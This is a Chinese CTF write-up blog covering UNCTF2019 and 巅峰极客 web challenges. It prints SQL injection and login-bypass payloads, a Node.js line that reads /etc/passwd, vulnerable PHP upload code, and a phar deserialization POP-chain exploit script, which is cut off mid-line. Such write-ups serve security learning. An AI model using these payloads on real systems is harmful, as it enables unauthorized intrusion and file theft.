<p>表:</p>
<p><code>GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()</code></p>
<p>security:emails,fl4g,referers,uagents,users</p>
<p>列名</p>
<p>fl4g:f1ag</p>
<p>最后的flag<code> UNCTF&#123;585ae8df50433972bb6ebd76e3ebd9f4&#125;</code></p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>又是一个vue应用</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg" alt="image.png"></p>
<p>在代码中发现</p>
<p>/calc: 可以命令执行,但是却没有办法找到有效的利用方式</p>
<p>后端是node.js</p>
<p>version: v10.12.0 </p>
<p>cwd:/usr</p>
<p>/usr目录</p>
<p> bin,games,include,lib,local,sbin,share,src </p>
<p>res.end(require(‘fs’).readFileSync(‘/etc/passwd’).toString())</p>
<p>require(‘fs’).readdirSync.(‘/etc/passwd’).toString()</p>
<p>在根目录下找到flag</p>
<p>  flag{0e4d1980ef6f8a81428f83e8e1c6e22b} </p>
<p>最后还是晚了一分钟</p>
<p>看来改天要看看nodejs的东东?</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/unctf2019/" data-id="ckw63s4ms006nflol8ze54ilq" data-title="unctf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-巅峰极客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:&#x61;&#x62;&#x63;&#x64;&#101;&#x66;&#x67;&#104;&#x69;&#x6a;&#49;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;">&#x61;&#x62;&#x63;&#x64;&#101;&#x66;&#x67;&#104;&#x69;&#x6a;&#49;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;</a></p>
<p>黑名单:union</p>
<p><code>fuckyoufuck&#39;/**/or/**/1^&#39;0</code></p>
<p>最后payload:<code>admin&#39;/*ffuuucckyou*/or/**/&#39;</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>已知文件:<code>file.php,download.php,index.php,upload_file.php</code></p>
<p>download.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\.|etc|var|tmp|usr/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/base|class|file|function|index|upload_file/i&#x27;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$name</span> = safe_replace(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/base|class|file|function|index|upload_file/i&#x27;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">                <span class="variable">$filename</span> = <span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">                <span class="variable">$dir</span> =<span class="string">&quot;./&quot;</span>;</span><br><span class="line">                <span class="variable">$down_host</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = fopen ( <span class="variable">$dir</span>.<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span> );</span><br><span class="line">                    Header ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> );</span><br><span class="line">                    Header ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );</span><br><span class="line">                    Header ( <span class="string">&quot;Accept-Length: &quot;</span> . filesize ( <span class="variable">$dir</span>.<span class="variable">$filename</span> ) );</span><br><span class="line">                    Header ( <span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="variable">$filename</span> );</span><br><span class="line">                    <span class="keyword">echo</span> fread ( <span class="variable">$file</span>, filesize ( <span class="variable">$dir</span> . <span class="variable">$filename</span> ) );</span><br><span class="line">                    fclose ( <span class="variable">$file</span> );</span><br><span class="line">                    <span class="keyword">exit</span> ();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> (<span class="string">&quot;file doesn&#x27;t exist.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>file.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\/|\.\.|flag/i&#x27;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>); </span><br><span class="line">&#125;<span class="keyword">elseif</span>(!preg_match(<span class="string">&#x27;/\//i&#x27;</span>,<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$text</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$text</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|flag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>分析发现一堆类，且file_exists可以触发phar反序列化漏洞</p>
<p>pop链:</p>
<p><code>sh0w($str=new S6ow)-&gt;S6ow($file=new Show,$_show=&quot;file_get&quot;)-&gt;Show($source=&#39;/flag&#39;)</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span>= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_show</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_show=<span class="string">&quot;file_get&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="string">&quot;_show&quot;</span>;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">            <span class="comment">//$this-&gt;file_get($arguments);</span></span><br><span class="line">            <span class="comment">//$this-&gt;&#123;$name&#125;=&quot;file_get&quot;</span></span><br><span class="line">            <span class="comment">//$name=_show</span></span><br><span class="line">            <span class="comment">//$file=new Show;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str =<span class="keyword">new</span> S6ow;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Sh0w();</span><br><span class="line"></span><br><span class="line">@unlink(<span 